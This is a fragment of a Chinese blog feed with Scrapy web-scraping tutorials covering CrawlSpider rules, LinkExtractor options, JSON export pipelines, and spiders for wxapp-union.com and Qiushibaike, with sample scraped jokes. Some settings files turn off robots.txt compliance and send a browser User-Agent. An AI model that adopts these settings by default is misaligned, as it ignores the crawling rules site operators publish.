self.fileProject.close()</code></pre><p>settings.py</p><pre><code>BOT_NAME = &#39;TecentSpider&#39;SPIDER_MODULES = [&#39;TecentSpider.spiders&#39;]NEWSPIDER_MODULE = &#39;TecentSpider.spiders&#39;ROBOTSTXT_OBEY = TrueDOWNLOAD_DELAY = 1ITEM_PIPELINES = {   &#39;TecentSpider.pipelines.TecentspiderPipeline&#39;: 300,}</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl TecentZhaoPin&quot;.split())</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ScrapyCrawlSpider</title>
      <link href="/2018/12/29/scrapycrawlspider/"/>
      <url>/2018/12/29/scrapycrawlspider/</url>
      
        <content type="html"><![CDATA[<h1 id="CrawlSpider"><a href="#CrawlSpider" class="headerlink" title="CrawlSpider"></a>CrawlSpider</h1><p>Spider类的设计原则是只爬取start_url列表中的网页，而CrawlSpider类定义了一些规则(rule)来提供跟进link的方便的机制，从爬取的网页中获取link并继续爬取的工作更适合。</p><p>CrawlSpider继承于Spider类，除了继承过来的属性外（name、allow_domains），还提供了新的属性和方法</p><p>CrawlSpider需要使用<strong>LinkExtractor对象和Rule对象</strong>来决定爬虫的具体访问规则</p><h1 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h1><p>CrawlSpider使用rule来决定爬取的规则,并将匹配后的url交给引擎.所以不需要我们手动的返回请求.</p><p>在Rules元组中包含了一个或多个Rule对象,每个Rule对象对爬取网站的动作定义了特定的操作,比如提取当前相应内容中的特定链接,是否最提取的链接进行跟进爬取(follw),对提交的请求设置回调函数等.</p><p>如果多个rule匹配了相同的链接,则根据规则在元组中被定义的顺序,第一个会被调用.</p><pre><code>class scrapy.spiders.Rule(        link_extractor,        callback = None,        cb_kwargs = None,        follow = None,        process_links = None,        process_request = None)</code></pre><p><strong>Rule参数解析:</strong></p><ul><li>link_extractor<ul><li>一个link_extractor对象,用来<strong>定义需要提取的链接.</strong></li></ul></li><li>callback<ul><li>每次从link_extractor中获取到链接时,参数所指定的值为回调函数,该回调函数接收一个response为<strong>第一个参数</strong>.</li><li>当编写爬虫规则时，<strong>避免使用parse作为回调函数。由于CrawlSpider使用parse方法来实现其逻辑，如果覆盖了 parse方法，crawl spider将会运行失败。</strong></li></ul></li><li>follow:<ul><li>是一个布尔值,<strong>指定了根据该规则从response提取的链接是否需要跟进,如果callback会None,Follow默认为True,否则默认为False,也就是说如果有回调函数的话,follow默认为True,如果没有回调函数的话,默认为False.</strong></li></ul></li><li>process_links<ul><li>指定该spider中哪个函数被调用,从link_extractor中获取到的链接列表时将会调用该函数.该方法主要用来过滤link_extractor.</li></ul></li><li>process_request<ul><li>指定该spider中哪个函数被调用,该规则提取到每个request时都会调用该函数.<strong>主要用来过滤request</strong></li></ul></li></ul><h1 id="LinkExtractor"><a href="#LinkExtractor" class="headerlink" title="LinkExtractor"></a>LinkExtractor</h1><p>Link Extractors对象的作用: 提取链接｡</p><p>每个LinkExtractor的公共方法是 extract_links()，它接收一个 Response 对象，并返回一个scrapy.link.Link 对象。</p><p>Link Extractors要实例化一次，并且 extract_links 方法会根据不同的 response 调用多次提取链接｡</p><pre><code>class scrapy.linkextractors.LinkExtractor(    allow = (),    deny = (),    allow_domains = (),    deny_domains = (),    deny_extensions = None,    restrict_xpaths = (),    tags = (&#39;a&#39;,&#39;area&#39;),    attrs = (&#39;href&#39;),    canonicalize = True,    unique = True,    process_value = None)</code></pre><ul><li>allow<ul><li>满足括号中“正则表达式”的URL会被提取，如果为空，则全部匹配</li></ul></li><li>deny<ul><li>满足括号中“正则表达式”的URL一定不提取（优先级高于allow）。</li></ul></li><li>allow_domains<ul><li>会被提取的链接的domains。</li></ul></li><li>deny_domains<ul><li>一定不会被提取链接的domains。</li></ul></li><li>restrict_xpaths<ul><li>使用xpath表达式，和allow共同作用过滤链接。 </li></ul></li></ul><h1 id="实战爬取微信小程序社区"><a href="#实战爬取微信小程序社区" class="headerlink" title="实战爬取微信小程序社区"></a>实战爬取微信小程序社区</h1><p>spider.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom scrapy.linkextractors import LinkExtractorfrom scrapy.spiders import CrawlSpider, Rulefrom WeiXinSmall.items import WeixinsmallItemclass WeixinappSpiderSpider(CrawlSpider):    name = &#39;WeiXinApp_Spider&#39;    allowed_domains = [&#39;wxapp-union.com&#39;]    start_urls = [&#39;http://www.wxapp-union.com/portal.php?mod=list&amp;catid=2&amp;page=1&#39;]    rules = (        Rule(LinkExtractor(allow=r&#39;.+mod=list&amp;catid=2&amp;page=\d&#39;), follow=True),  # 教程页面的url获取规则        Rule(LinkExtractor(allow=r&#39;.+article-.+\.html&#39;), callback=&quot;parse_detail&quot;, follow=False),  # 详情页面的URL规则    )    # def parse_item(self, response):    #     i = {}    #     # i[&#39;domain_id&#39;] = response.xpath(&#39;//input[@id=&quot;sid&quot;]/@value&#39;).extract()    #     # i[&#39;name&#39;] = response.xpath(&#39;//div[@id=&quot;name&quot;]&#39;).extract()    #     # i[&#39;description&#39;] = response.xpath(&#39;//div[@id=&quot;description&quot;]&#39;).extract()    #     return i    def parse_detail(self, response):        &#39;&#39;&#39;详情页面的解析&#39;&#39;&#39;        title = response.xpath(&quot;//h1[@class=&#39;ph&#39;]/text()&quot;).get()        authors = response.xpath(&quot;//p[@class=&#39;authors&#39;]&quot;)        author = authors.xpath(&quot;.//a/text()&quot;).get()        time = authors.xpath(&quot;.//span[@class=&#39;time&#39;]/text()&quot;).get()        article_content = response.xpath(&quot;//*[@id=&#39;article_content&#39;]//text()&quot;).getall()        content = &quot;&quot;.join(article_content).strip()  # content,返回的列表中有很多空格和制表符,这里做处理        print(content)        print(f&quot;文章作者{author}\t\t发表时间{time}&quot;)        print(title)        item = WeixinsmallItem(title=title, author=author, time=time, content=content)        yield item</code></pre><p>Items.py</p><pre><code>import scrapyclass WeixinsmallItem(scrapy.Item):    title = scrapy.Field()      # 文章标题    author = scrapy.Field()     # 文章作者    time = scrapy.Field()       # 发表时间    content = scrapy.Field()    # 文章内容</code></pre><p>middlewares.py</p><p>默认无修改</p><p>pipeline.py</p><pre><code>from scrapy.exporters import JsonLinesItemExporterclass WeixinsmallPipeline(object):    def __init__(self):        self.fileProject = open(&#39;WXApp_Spider.json&#39;, &#39;wb&#39;)        self.exporter = JsonLinesItemExporter(self.fileProject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def process_item(self, item, spider):        self.exporter.export_item(item)        return item    def close_spider(self, spider):        self.fileProject.close()</code></pre><p>settings.py</p><pre><code>ITEM_PIPELINES = {   &#39;WeiXinSmall.pipelines.WeixinsmallPipeline&#39;: 300,}DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;,}DOWNLOAD_DELAY = 1      # 爬虫延迟一秒钟ROBOTSTXT_OBEY = FalseBOT_NAME = &#39;WeiXinSmall&#39;SPIDER_MODULES = [&#39;WeiXinSmall.spiders&#39;]NEWSPIDER_MODULE = &#39;WeiXinSmall.spiders&#39;</code></pre><p>start.py</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl WeiXinApp_Spider&quot;.split())</code></pre><h1 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a>数据展示</h1>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapy爬取糗事百科</title>
      <link href="/2018/12/27/scrapy-pa-qu-qiu-shi-bai-ke/"/>
      <url>/2018/12/27/scrapy-pa-qu-qiu-shi-bai-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><pre><code>{&quot;author&quot;: &quot;毒男·i&quot;, &quot;content&quot;: &quot;\n\n\n在医院里，我和老婆抱着孩子去看病。老婆说：“你说女人要不要学一点防狼术。”我说：“需要啊。”老婆说：“假如我身边有一只狼，动不动就欺负我，该怎么办。”我说：“我来教训他。”老婆说：“老公你对我真好。”我说：“那当然了。”老婆说：“那好，你去前面男科，把自己结扎了。”我说：“为啥。”老婆说：“就是你这头狼，动不动就把持不住自己，我又害怕做人流，我首先得防你啊！”\n\n&quot;}{&quot;author&quot;: &quot;没钱啊！糗大了。&quot;, &quot;content&quot;: &quot;\n\n\n这女人真是惹不起，公司张总老去骚扰出纳员，弄的她打也不是骂也不是，结果这回开支，我们都是面额100元的，出纳尽然把他弟弟做买卖的零钱，拿来给张总开支，都是一元五元的，好吗，几万块足足两大方便袋，出纳说在骚扰我，下回开支就都是一元的硬币，把我们笑的肚子都疼。\n\n&quot;}{&quot;author&quot;: &quot;无书斋主&quot;, &quot;content&quot;: &quot;\n\n\n中午我做饭的时间，放在客厅的电话响了，我问老婆谁？老婆看了下是陌生电话……我叫按免提帮接下……老婆接后说了声:喂，你好……那边停顿大约五秒后:一个男声说，我爱你！！！\n\n&quot;}{&quot;author&quot;: &quot;胖香&quot;, &quot;content&quot;: &quot;\n\n\n老妈说老家二楼顶子好像漏雨，让我哥趁没上冻回去给补补，我哥总说忙，我搭了一句话:“这点小事，我这女汉子出马分分钟搞定！”我妈考虑了一下跟我说:“别了，冬天也没大雨，你要是上去修不好再压一下，我怕到时候屋里飘雪花……”\n\n&quot;}{&quot;author&quot;: &quot;孙小欠儿&quot;, &quot;content&quot;: &quot;\n\n\n晚上躺床上问媳妇儿“嗲”怎么写，媳妇儿说那么简单的字都不会写‘这边一个口那边一个爹’我A了一声…………然后就在床下啦\n\n&quot;}{&quot;author&quot;: &quot;聊天不撩妹子&quot;, &quot;content&quot;: &quot;\n\n\n小侄女初中毕业就不读书了，天天在家玩游戏，什么事也不做，堂哥让我给找个班上。公司边上刚好有家食品厂招人，就介绍她去了。昨天厂里发工资，我问她拿了多少钱。她说发六百多。我问她说试用期工资也不可能这么低吧，要不换个厂上班去。她说才不换呢，厂里生产的都是我爱吃的，一个月我都长高两公分了。长高没长高我不知道，反正脸蛋园了\n\n&quot;}{&quot;author&quot;: &quot;陌年微凉-&quot;, &quot;content&quot;: &quot;\n\n\n自从交了女朋友我才知道，原来口红有正红，枫叶红，玫瑰红！护肤的有精华液，爽肤水，补水乳还有面霜，眼霜，唇膜！并且我还知道了，男朋友可以有好几个，暖床的，付钱的，无聊的时候陪玩的～\n\n&quot;}{&quot;author&quot;: &quot;无书斋主&quot;, &quot;content&quot;: &quot;\n\n\n小舅子四岁的女儿在我家吃晚饭，做特意做了她喜欢吃的虾和牛肉，她很懂事，一个劲的说谢谢姑爸爸（姑父的意思）……舅子来接她的时间，我说喜欢吃姑爸爸做的菜，就住姑爸爸家里好不？不好不好，姑爸爸刚给姑姑说,说我又吃了他们一个星期的生活费，要姑姑早点把我送回去，现在说要我住，骗人……我去，这让我怎么接？？\n\n&quot;}{&quot;author&quot;: &quot;雷霆万钧～&quot;, &quot;content&quot;: &quot;\n\n\n在丈母娘家吃饭，丈母娘跟老丈人赌气没吃饭，吃过饭跟老丈人下棋，老丈人明显心不在焉，看了看在餐桌旁边转悠的丈母娘，放下棋子就去了厕所，回来没下一会，又去了厕所。我跟丈母娘说：爸是不是肚子不舒服？要不要我去给他买点药？丈母娘白了我一眼：你爸知道我馋那猪蹄了，又不好意思吃，就特意去厕所，让我偷吃，谁知道你这傻小子傻楞在这不走了！\n\n&quot;}{&quot;author&quot;: &quot;传说中的谢漂亮&quot;, &quot;content&quot;: &quot;\n\n\n今天剑大哥发表了一动态。。丈母娘，是时候发货啦！要不然只给一星评价了。。。\n\n&quot;}{&quot;author&quot;: &quot;老巫婆～～&quot;, &quot;content&quot;: &quot;\n\n\n表弟去相亲，第一次女方问表弟“谈过恋爱吗？”表弟说：没谈过！女方嫌弃地走了，说是没有恋爱经验的不要！第二次女方问表弟“谈过恋爱吗？”这次表弟学乖了说：“有，谈了好几次恋爱了！”女方又嫌弃地走了，说表弟是花心大萝卜…第三次表弟变被动为主动，抢先问对方有没有谈过恋爱。结果女方嫌弃他说话太直白不够委婉，也…也走了…\n\n&quot;}{&quot;author&quot;: &quot;渣渣婉儿&quot;, &quot;content&quot;: &quot;\n\n\n男朋友说我卸了妆能过万圣节，我笑了，你脱了裤子能过儿童节～\n\n&quot;}{&quot;author&quot;: &quot;胖香&quot;, &quot;content&quot;: &quot;\n\n\n女儿考试被老师表扬，回家我很高兴的跟她说:“你想要什么奖励？”她兴奋的说:“上次大姨给小弟弟剃了光头，那个脑袋摸着好舒服，你能剃光给我摸吗？！”\n\n&quot;}{&quot;author&quot;: &quot;918疯狂英子&quot;, &quot;content&quot;: &quot;\n\n\n姐姐结婚的时候我都没空回去，都不知姐夫张啥样，今年回家顺道去姐姐家玩，打个的，师傅猥琐的眼神说很远的某某小区八十！去到姐姐家我才知道被坑了，吃饭的时候姐夫回来了，你能想象我看到姐夫就是那个出租车师傅时的表情吗？当晚他就被姐姐赶出房间睡大厅\n\n&quot;}{&quot;author&quot;: &quot;找女友的单身猪&quot;, &quot;content&quot;: &quot;\n\n\n一旦你们公司装上了打卡机，就意味着你们的公司不行了，你们的老板思想迂腐，终究是个穷逼公司，早走早发财。\n\n&quot;}{&quot;author&quot;: &quot;醉酒舞剑砍疯子.&quot;, &quot;content&quot;: &quot;\n\n\n昨天，带着我家二哈去钓鱼，我静静的坐在河边，傻狗在河沿上到处撒欢跑！突然有鱼上钩，我快速起竿收线，一看，哇～！一条二斤多的鲤鱼，我把鱼放进水桶里，兴奋的喊二哈来看我的收获！二哈听见我喊它，呼呼的朝我奔来！结果这傻狗没刹住，把我的水桶撞翻了，正好滚到河里！\n\n&quot;}{&quot;author&quot;: &quot;奔跑的小土狼&quot;, &quot;content&quot;: &quot;\n\n\n公司成立八周年！老板请吃饭，跟他坐一桌的除了秘书，全是销售部那些精英小伙子们，副总、经理都得靠边站小周在我线上干活儿，这小子一点儿拼劲儿都没有我对他说：你要能坐到那个桌上去，在咱们厂就算个人物了小周：咱老板不要男秘书吧\n\n&quot;}{&quot;author&quot;: &quot;无书斋主&quot;, &quot;content&quot;: &quot;\n\n\n昨天单位小刘来办公室给我说:正叔，你帮我个忙，我今天相亲，对方会带爸妈来，你就当我两个小时的爸爸好不好？拜托了……我想想答应了……到了小刘约定的地方，对面一个二十多的小哥看着我问小刘:这就是你喜欢的老鬼？迎面就是一拳……不是我有点功夫底子，估计会被打死！！\n\n&quot;}{&quot;author&quot;: &quot;爱新觉罗.黄瓜&quot;, &quot;content&quot;: &quot;\n\n\n每次惹老婆生气，她都会去厨房拍鸡蛋撒气，完事后将鸡蛋残 渣收集起来，做一碗鸡蛋羹，亲手喂给我吃！她喂我鸡蛋羹时，嘴里还振振有词:“你个大坏蛋！我拍死你，烫死你，咸死你！”在亲朋好友眼中这是秀恩爱，而在我心里，这只不过又是一次恶作剧式的惩 罚！\n\n&quot;}{&quot;author&quot;: &quot;=正在中最&quot;, &quot;content&quot;: &quot;\n\n\n有一回，有个人欠揍，于是，我想打他可打不到，他刚想往前伸头结果我想做个样子，啪的一声，牙都掉了\n\n&quot;}{&quot;author&quot;: &quot;老巫婆～～&quot;, &quot;content&quot;: &quot;\n\n\n医生从病房出来后，我赶紧冲上去，抓起医生的手急切的问到:“医生，他怎么样？他会不会死啊？”医生不急不缓的说:“病人目前没什么大碍，只是你下手重了点，把他打晕了！”我深深的舒了口气，前男友约我今晚见面，用擀面杖把他打晕了我也是 逼 不 得已~\n\n&quot;}{&quot;author&quot;: &quot;毒男·i&quot;, &quot;content&quot;: &quot;\n\n\n媳妇和大姨子是双胞胎，媳妇在家一边抱着出生不久的小外甥，一边当我面埋怨她双胞胎姐姐：“别人都说双胞胎好，我就不这样认为！”我补充说：“双胞胎多好啊！从小就不孤单，可以互相替上班，替上学，多让人羡慕啊！”媳妇把小外甥放在旁边：“对！也就我那二货姐姐能想出来，她去度假，让我在家骗他孩子当他妈妈！”\n\n&quot;}{&quot;author&quot;: &quot;挖鼻孔的老虎&quot;, &quot;content&quot;: &quot;\n\n\n半夜回家经过一条巷子，看到一只兔子蹲在墙角，忍不住去摸一摸它。我到现在都特么想不明白，究竟什么样的人会给流浪狗戴上兔耳朵？\n\n&quot;}{&quot;author&quot;: &quot;恨钱不成山&quot;, &quot;content&quot;: &quot;\n\n\n跟朋友去某四儿子店看车，朋友跟店员砍价，店员说说做不了主，要跟经理请示一下！于是他用手机拨通了经理的电话，就在店员跟经理热火朝天商量价格的时候，突然～店员的手机响起了音乐\n\n&quot;}{&quot;author&quot;: &quot;天山无情剑&quot;, &quot;content&quot;: &quot;\n\n\n她妈的，糗百里这个糖糖怎么天天都在，你是哪个鬼\n\n&quot;}</code></pre><h1 id="新建Scrapy项目"><a href="#新建Scrapy项目" class="headerlink" title="新建Scrapy项目"></a>新建Scrapy项目</h1><pre><code>scrapy startproject 项目名称scrapy startproject QiuShiBaiKe</code></pre><h2 id="项目目录解析"><a href="#项目目录解析" class="headerlink" title="项目目录解析"></a>项目目录解析</h2><pre><code>L:.│  scrapy.cfg│  start.py│  Test.py│  Test2.py│└─QiuShiBaiKe        # 项目文件夹    │  items.py        # 用来存放爬虫爬取下来数据的模型    │  middlewares.py    # 中间件文件    │  pipelines.py        # 用来将Items的模型存储到本地磁盘中    │  QiuShiBaiKe.json    │  settings.py        # 本爬虫的一些配置信息(请求头,ip代理池等配置)    │  __init__.py    │    ├─spiders    │  │  QiuShi.py        # 爬虫文件,运行scrapy genspider 命令自动生成的文件    │  │  __init__.py</code></pre><h2 id="创建一个爬虫"><a href="#创建一个爬虫" class="headerlink" title="创建一个爬虫"></a>创建一个爬虫</h2><pre><code>scrapy genspider QiuShi &quot;qiushibaike.com&quot;</code></pre><h2 id="运行Scrapy-使用Python脚本运行Scrapy项目"><a href="#运行Scrapy-使用Python脚本运行Scrapy项目" class="headerlink" title="运行Scrapy(使用Python脚本运行Scrapy项目)"></a>运行Scrapy(使用Python脚本运行Scrapy项目)</h2><p>运行Scrapy项目,需要在终端下进入项目的根目录,然后执行Scrapy crawl [爬虫名字],如果不想每次都在终端运行可以把这个命令写在一个Python脚本文件中,然后再Pycharm中运行脚本即可.</p><p>新建一个Start.py的文件,然后写入以下代码.</p><pre><code>from scrapy import cmdlinecmdline.execute(&quot;scrapy crawl QiuShi&quot;.split())</code></pre><p>scrapy crawl <strong>QiuShi(这里是爬虫名字,而不是Scrapy项目的名字)</strong></p><h1 id="版本一-完成简单的爬取并将数据保存成JSON格式"><a href="#版本一-完成简单的爬取并将数据保存成JSON格式" class="headerlink" title="版本一:完成简单的爬取并将数据保存成JSON格式"></a>版本一:完成简单的爬取并将数据保存成JSON格式</h1><p>QiuShi.py</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom QiuShiBaiKe.items import QiushibaikeItemfrom scrapy.http.response.html import HtmlResponseclass QiushiSpider(scrapy.Spider):    name = &#39;QiuShi&#39;    allowed_domains = [&#39;qiushibaike.com&#39;]  # 爬虫域限制域    start_urls = [&#39;https://www.qiushibaike.com/text/page/1/&#39;]  # 开始的URL    def parse(self, response):        outerbox = response.xpath(&quot;//div[@id=&#39;content-left&#39;]/div&quot;)  # 使用Scrapy内置的xpath进行元素怒的选择        for box in outerbox:            # 提取作者和内容            author = box.xpath(&quot;.//h2/text()&quot;).extract_first().strip()            content = box.xpath(&quot;.//div[@class=&#39;content&#39;]/span/text()&quot;).getall()            content = &#39;&#39;.join(content)            items = QiushibaikeItem(author=author, content=content)            yield items  # 生成器,只要一个函数中有yield那么他就不是一个普通的函数了,而是一个生成器.</code></pre><p>items.py</p><pre><code># -*- coding: utf-8 -*-# Define here the models for your scraped items## See documentation in:# https://doc.scrapy.org/en/latest/topics/items.html# Item定义数据模型import scrapyclass QiushibaikeItem(scrapy.Item):    author = scrapy.Field()    content = scrapy.Field()</code></pre><p>middlewares.py</p><p>初始文件并未改动</p><p>piplines.py</p><pre><code># -*- coding: utf-8 -*-# Define your item pipelines here## Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html# Piplines用来将Item的数据模型存储到硬盘中import jsonclass QiushibaikePipeline(object):    &#39;&#39;&#39;将item的数据模型存储到JSON文件中&#39;&#39;&#39;    def __init__(self):        # 创建文件对象        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)  # 打开文件    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplines开始保存数据&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;处理item,写入文件&#39;&#39;&#39;        item_json = json.dumps(dict(item),ensure_ascii=False)         # 将item传过来的数据,转换成JSON,ensure_ascii为False才能转换成中文        self.fileproject.write(item_json + &quot;\n&quot;)        return item    def close_spider(self, spider):        &#39;&#39;&#39;关闭爬虫&#39;&#39;&#39;        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplines结束保存数据&#39;)        print(&#39;*&#39; * 50)</code></pre><p>settings.py</p><pre><code>BOT_NAME = &#39;QiuShiBaiKe&#39;SPIDER_MODULES = [&#39;QiuShiBaiKe.spiders&#39;]NEWSPIDER_MODULE = &#39;QiuShiBaiKe.spiders&#39;# 是否遵守爬虫协议,改为FalseROBOTSTXT_OBEY = False        # 添加请求头DEFAULT_REQUEST_HEADERS = {    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,    &#39;Accept-Language&#39;: &#39;en&#39;,    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&#39;,}# 开启ITEM_PIPELINES# 后面的Value是指优先级ITEM_PIPELINES = {    &#39;QiuShiBaiKe.pipelines.QiushibaikePipeline&#39;: 300,}</code></pre><h1 id="版本-二-优化数据存储方式-一-使用JsonItemExporter存储数据"><a href="#版本-二-优化数据存储方式-一-使用JsonItemExporter存储数据" class="headerlink" title="版本(二)优化数据存储方式(一)使用JsonItemExporter存储数据"></a>版本(二)优化数据存储方式(一)使用JsonItemExporter存储数据</h1><p>其他文件不变,piplines文件修改如下</p><p>piplines.py</p><pre><code>from scrapy.exporters import JsonItemExporter       # Scrapy内置的JSON导出模块class QiushibaikePipeline(object):    &#39;&#39;&#39;将item的数据模型存储到JSON文件中&#39;&#39;&#39;    def __init__(self):        # 创建文件对象        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;wb&#39;)  # 以二进制的方式打开文件        self.exportar = JsonItemExporter(self.fileproject,ensure_ascii=False,encoding=&#39;utf-8&#39;)        self.exportar.start_exporting()     # 开始导出    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplines开始保存数据&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;处理item,写入文件&#39;&#39;&#39;        self.exportar.export_item(item)        return item    def close_spider(self, spider):        &#39;&#39;&#39;关闭爬虫&#39;&#39;&#39;        self.exportar.finish_exporting()        # 完成导入        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplines结束保存数据&#39;)        print(&#39;*&#39; * 50)</code></pre><p>这种存储json文件的方式有个弊端,就是<strong>它会将所有的JSON数据都保存到一个列表中,非常消耗内存,适合数据量比较小的项目</strong></p><h1 id="版本-三-优化数据存储的方式-二-使用JsonLinesItemExporter存储数据"><a href="#版本-三-优化数据存储的方式-二-使用JsonLinesItemExporter存储数据" class="headerlink" title="版本(三)优化数据存储的方式(二)使用JsonLinesItemExporter存储数据"></a>版本(三)优化数据存储的方式(二)使用JsonLinesItemExporter存储数据</h1><p>修改piplines,其他代码不变</p><pre><code># -*- coding: utf-8 -*-# Piplines用来将Item的数据模型存储到硬盘中from scrapy.exporters import JsonLinesItemExporter  # Scrapy内置的JSON导出模块class QiushibaikePipeline(object):    &#39;&#39;&#39;将item的数据模型存储到JSON文件中&#39;&#39;&#39;    def __init__(self):        # 创建文件对象        self.fileproject = open(&#39;QiuShiBaiKe.json&#39;, &#39;wb&#39;)  # 以二进制的方式打开文件        self.exportar = JsonLinesItemExporter(self.fileproject, ensure_ascii=False, encoding=&#39;utf-8&#39;)    def open_spider(self, spider):        print(&#39;*&#39; * 50)        print(&#39;Piplines开始保存数据&#39;)        print(&#39;*&#39; * 50)    def process_item(self, item, spider):        &#39;&#39;&#39;处理item,写入文件&#39;&#39;&#39;        self.exportar.export_item(item)        return item    def close_spider(self, spider):        &#39;&#39;&#39;关闭爬虫&#39;&#39;&#39;        self.fileproject.close()        print(&#39;*&#39; * 50)        print(&#39;Piplines结束保存数据&#39;)        print(&#39;*&#39; * 50)</code></pre><p>这种存储JSON的方法是以1条数据一行的形式,<strong>每一行是一个JSON,适合数据量比较大的项目</strong></p><h1 id="多页面抓取"><a href="#多页面抓取" class="headerlink" title="多页面抓取"></a>多页面抓取</h1><p>修改setting.py</p><p>将下载延迟修改成1,下载之前等待1秒钟.</p><pre><code>DOWNLOAD_DELAY = 1</code></pre><p>修改Qiushi.py,完成多页面爬取</p><pre><code># -*- coding: utf-8 -*-import scrapyfrom QiuShiBaiKe.items import QiushibaikeItemfrom scrapy.http.response.html import HtmlResponseclass QiushiSpider(scrapy.Spider):    name = &#39;QiuShi&#39;    allowed_domains = [&#39;qiushibaike.com&#39;]  # 爬虫域限制域    start_urls = [&#39;https://www.qiushibaike.com/text/page/1/&#39;]  # 开始的URL    base_domain =&#39;https://www.qiushibaike.com&#39;    def parse(self, response):        outerbox = response.xpath(&quot;//div[@id=&#39;content-left&#39;]/div&quot;)  # 使用Scrapy内置的xpath进行元素怒的选择        for box in outerbox:            # 提取作者和内容            author = box.xpath(&quot;.//h2/text()&quot;).extract_first().strip()            content = box.xpath(&quot;.//div[@class=&#39;content&#39;]/span/text()&quot;).getall()            content = &#39;&#39;.join(content)            items = QiushibaikeItem(author=author, content=content)            yield items  # 生成器,只要一个函数中有yield那么他就不是一个普通的函数了,而是一个生成器.        # 当yield 返回当前item之后然后再去爬取下一页的链接        next_url = response.xpath(&quot;//ul[@class=&#39;pagination&#39;]/li[last()]/a/@href&quot;).get()  # 得到下一页的url#       print(next_url)     # /text/page/2/        if not next_url:            return        else:            # 这个Request类中需要注意:            # 第一个参数是请求的url            # 第二个参数是如果请求的url成功,之后需要执行哪个函数            # 总的来说就是:去请求url,如果请求成功,那么就调用方法去解析请求回来的页面            yield scrapy.Request(self.base_domain+next_url, callback=self.parse)</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>Scrapy框架支持9种数据的导出.具体参考scrapy.exporters</strong></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/ZuEzizylr1OuTFsfNbmnHCjXJ29s*jW7qfxaRnHeqTk!/b/dL8AAAAAAAAA&amp;bo=lAE1AQAAAAADB4M!&amp;rf=viewer_4" alt=""></p><ol><li>response是一个’scrapy.http.response.html.HtmlResponse’的对象,内有两个重要的网页提取方法css和xpath</li><li>提取出来的数据是一个’selector’或者是’selectorList’的对象,如果想获取其中的字符串那应该执行getall或者get方法<ul><li>getall方法:获取selector中的所有文本,返回一个列表</li><li>获取的是selector中的第一个文本</li></ul></li><li>如果在spider中请求的数据解析完成之后需要传给Piplines处理,那么可以使用yield将解析函数变成一个生成器,或者是可以收集所有的item,最后使用return返回.</li><li>建议在Item中定义好数据模型.</li><li>Piplines:专门用来保存数据,其中有三个经常用到的方法:<ol><li>open_spider(self,spider):当爬虫打开的时候执行</li><li>process_item(self,item,spider):当爬虫有(item)数据传过来时候会被调用</li><li>close_spider(self,spider):当爬虫关闭的时候会被调用</li><li>写完Pipline之后必须在setting中配置激活</li><li>Pipline激活是一个字典,该字典中的值表示,piplines的优先级</li></ol></li></ol><p>激活PipLines</p><pre><code>ITEM_PIPELINES = {    &#39;QiuShiBaiKe.pipelines.QiushibaikePipeline&#39;: 300,}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python爬虫 </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>银行是如何进行赚钱的</title>
      <link href="/2018/12/26/yin-xing-shi-ru-he-jin-xing-zhuan-qian-de/"/>
      <url>/2018/12/26/yin-xing-shi-ru-he-jin-xing-zhuan-qian-de/</url>
      
